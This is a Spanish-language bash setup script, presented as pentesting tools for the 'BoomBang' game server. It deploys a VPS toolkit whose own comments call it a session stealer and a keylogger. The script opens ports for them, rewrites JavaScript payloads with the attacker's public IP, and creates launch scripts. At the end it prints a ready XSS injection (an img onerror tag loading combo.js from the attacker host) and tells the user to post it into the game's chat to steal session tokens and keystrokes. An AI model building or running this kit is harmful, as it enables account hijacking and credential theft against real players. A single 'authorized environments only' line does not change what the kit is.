#!/bin/bash

################################################################################
# XSS Attack Setup Script
# BoomBang Server Pentesting Tools
#
# Este script configura automáticamente todo lo necesario para ejecutar
# los ataques XSS en un VPS con Ubuntu/Debian
#
# Uso: bash setup.sh
################################################################################

set -e  # Salir si hay error

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${GREEN}"
echo "=========================================="
echo "  XSS ATTACK SETUP - BoomBang Pentesting"
echo "=========================================="
echo -e "${NC}"

# Función para imprimir mensajes
print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

# Verificar si estamos en Linux
if [[ "$OSTYPE" != "linux-gnu"* ]]; then
    print_warning "Este script está diseñado para Linux (Ubuntu/Debian)"
    print_warning "Detectado: $OSTYPE"
    read -p "¿Continuar de todas formas? (y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

# Paso 1: Actualizar sistema
print_info "Actualizando sistema..."
sudo apt update -qq
print_success "Sistema actualizado"

# Paso 2: Instalar Python 3
print_info "Verificando Python 3..."
if ! command -v python3 &> /dev/null; then
    print_info "Instalando Python 3..."
    sudo apt install -y python3 python3-pip
else
    print_success "Python 3 ya está instalado ($(python3 --version))"
fi

# Paso 3: Instalar Flask
print_info "Verificando Flask..."
if ! python3 -c "import flask" &> /dev/null; then
    print_info "Instalando Flask..."
    pip3 install flask
else
    print_success "Flask ya está instalado"
fi

# Paso 4: Crear directorios
print_info "Creando estructura de directorios..."
mkdir -p logs
mkdir -p payloads
print_success "Directorios creados"

# Paso 5: Configurar firewall (si UFW está instalado)
print_info "Configurando firewall..."
if command -v ufw &> /dev/null; then
    sudo ufw allow 5000/tcp comment 'XSS Session Stealer' > /dev/null 2>&1 || true
    sudo ufw allow 6000/tcp comment 'XSS Keylogger' > /dev/null 2>&1 || true
    sudo ufw allow 8000/tcp comment 'XSS Payloads Server' > /dev/null 2>&1 || true
    sudo ufw reload > /dev/null 2>&1 || true
    print_success "Firewall configurado (puertos 5000, 6000, 8000 abiertos)"
else
    print_warning "UFW no está instalado, saltando configuración de firewall"
    print_warning "IMPORTANTE: Debes abrir manualmente los puertos 5000, 6000 y 8000"
fi

# Paso 6: Detectar IP pública
print_info "Detectando IP pública del VPS..."
PUBLIC_IP=$(curl -s ifconfig.me || curl -s icanhazip.com || echo "NO_DETECTADA")
if [ "$PUBLIC_IP" != "NO_DETECTADA" ]; then
    print_success "IP pública detectada: ${GREEN}$PUBLIC_IP${NC}"
else
    print_warning "No se pudo detectar la IP pública automáticamente"
    read -p "Ingresa tu IP pública manualmente: " PUBLIC_IP
fi

# Paso 7: Configurar payloads con la IP correcta
print_info "Configurando payloads con tu IP..."
if [ "$PUBLIC_IP" != "NO_DETECTADA" ] && [ -n "$PUBLIC_IP" ]; then
    for file in payloads/*.js; do
        if [ -f "$file" ]; then
            sed -i "s/TU_VPS_IP/$PUBLIC_IP/g" "$file"
        fi
    done
    print_success "Payloads configurados con IP: $PUBLIC_IP"
else
    print_warning "Debes configurar manualmente la IP en los archivos payloads/*.js"
fi

# Paso 8: Crear script de inicio rápido
print_info "Creando script de inicio rápido..."
cat > start_all.sh << 'EOFSTART'
#!/bin/bash

echo "Iniciando servidores XSS..."

# Crear sesiones screen
screen -dmS xss_session python3 session_stealer.py
screen -dmS xss_keylog python3 keylogger.py
screen -dmS xss_payloads bash -c 'cd payloads && python3 -m http.server 8000'

sleep 2

echo ""
echo "✓ Servidores iniciados en modo background"
echo ""
echo "Sesiones activas:"
screen -ls
echo ""
echo "Dashboards:"
echo "  - Session Stealer: http://$(curl -s ifconfig.me):5000/dashboard"
echo "  - Keylogger: http://$(curl -s ifconfig.me):6000/view"
echo ""
echo "Comandos útiles:"
echo "  - Ver sesión: screen -r xss_session"
echo "  - Detener todo: bash stop_all.sh"
echo "  - Ver logs: tail -f logs/*.log"
echo ""
EOFSTART

chmod +x start_all.sh
print_success "Script de inicio creado: ./start_all.sh"

# Paso 9: Crear script de parada
print_info "Creando script de parada..."
cat > stop_all.sh << 'EOFSTOP'
#!/bin/bash

echo "Deteniendo servidores XSS..."

# Matar sesiones screen
screen -S xss_session -X quit 2>/dev/null || true
screen -S xss_keylog -X quit 2>/dev/null || true
screen -S xss_payloads -X quit 2>/dev/null || true

# Por si acaso, matar procesos Python en esos puertos
lsof -ti:5000 | xargs kill -9 2>/dev/null || true
lsof -ti:6000 | xargs kill -9 2>/dev/null || true
lsof -ti:8000 | xargs kill -9 2>/dev/null || true

echo "✓ Servidores detenidos"
EOFSTOP

chmod +x stop_all.sh
print_success "Script de parada creado: ./stop_all.sh"

# Paso 10: Hacer scripts ejecutables
chmod +x *.py

# Resumen final
echo ""
echo -e "${GREEN}=========================================="
echo "  INSTALACIÓN COMPLETADA"
echo -e "==========================================${NC}"
echo ""
echo -e "${BLUE}Tu IP pública:${NC} $PUBLIC_IP"
echo ""
echo -e "${BLUE}Próximos pasos:${NC}"
echo "  1. Iniciar servidores: ${GREEN}./start_all.sh${NC}"
echo "  2. Verificar dashboards:"
echo "     • http://$PUBLIC_IP:5000/dashboard"
echo "     • http://$PUBLIC_IP:6000/view"
echo "  3. Inyectar payload en el chat del juego"
echo ""
echo -e "${BLUE}Payloads disponibles en:${NC} payloads/"
echo "  • session_steal.js  - Roba tokens de sesión"
echo "  • keylogger.js      - Captura teclas"
echo "  • combo.js          - Ambos ataques combinados"
echo ""
echo -e "${BLUE}Ejemplo de inyección XSS:${NC}"
echo "  <img src=x onerror='var s=document.createElement(\"script\");s.src=\"http://$PUBLIC_IP:8000/combo.js\";document.body.appendChild(s);'>"
echo ""
echo -e "${YELLOW}IMPORTANTE:${NC}"
echo "  • Asegúrate de que los puertos 5000, 6000 y 8000 estén abiertos"
echo "  • Si usas AWS/DigitalOcean, configura Security Groups/Firewall"
echo "  • Usa esto SOLO en entornos autorizados"
echo ""
print_success "Setup completado!"
echo ""
